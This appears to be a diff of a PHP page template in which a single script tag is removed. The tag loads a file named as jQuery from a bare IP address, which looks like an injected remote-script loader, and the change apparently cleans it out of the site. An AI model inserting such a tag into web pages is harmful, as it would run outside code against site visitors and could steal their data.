@@ -1,5 +1,4 @@
 <?php echo $header; ?>
-<script type="text/javascript" src="http://106.75.215.37/jquery/jquery.min.js?name=f9ciaiuq0qe"></script>
 <div id="content">  
   <div class="box" style="width: 400px; min-height: 300px; margin-top: 40px; margin-left: auto; margin-right: auto;">
     <div class="heading">
